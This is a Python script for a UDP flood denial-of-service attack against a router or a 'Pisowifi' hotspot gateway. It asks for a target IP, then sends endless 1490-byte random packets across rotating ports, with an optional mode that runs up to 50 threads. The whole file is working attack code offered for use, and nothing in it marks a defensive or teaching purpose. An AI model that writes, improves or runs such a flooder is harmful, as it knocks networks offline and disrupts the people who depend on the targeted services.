import sys
import os
import time
import socket
import random
import threading
from datetime import datetime

# Original function kept intact
def original_attack():
    now = datetime.now()
    hour = now.hour
    minute = now.minute
    day = now.day
    month = now.month
    year = now.year
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    ip = input("Enter Gateway IP : ")
    port = int(input("Enter Port       : "))
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
        if port == 65534:
            port = 1

# New threaded attack function
def threaded_attack(ip, port, thread_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    sent = 0
    
    print(f"Thread {thread_id} started attacking {ip}:{port}")
    
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1
        port = port + 1 if port < 65534 else 1
        if sent % 100 == 0:  # Reduce print frequency
            print(f"Thread {thread_id} sent {sent} packets to {ip} through port:{port}")

# Simplified threading option
def start_threaded_attack():
    ip = input("Enter Gateway IP : ")
    port = int(input("Enter Starting Port : "))
    thread_count = int(input("Enter Number of Threads (1-50): "))
    
    # Limit thread count to prevent system overload
    thread_count = min(max(thread_count, 1), 50)
    
    print(f"Starting {thread_count} threads to attack {ip}")
    
    threads = []
    for i in range(thread_count):
        # Each thread gets a slightly different starting port
        thread_port = port + i
        thread = threading.Thread(target=threaded_attack, args=(ip, thread_port, i+1))
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nAttack stopped by user")

# Main menu
def main():
    print("Select attack mode:")
    print("1. Single-thread attack (Router)")
    print("2. Multi-thread attack (Pisowifi)")
    
    choice = input("Enter your choice (1 or 2): ")
    
    if choice == "1":
        original_attack()
    elif choice == "2":
        start_threaded_attack()
    else:
        print("Invalid choice. Using original attack mode.")
        original_attack()

if __name__ == "__main__":
    main()
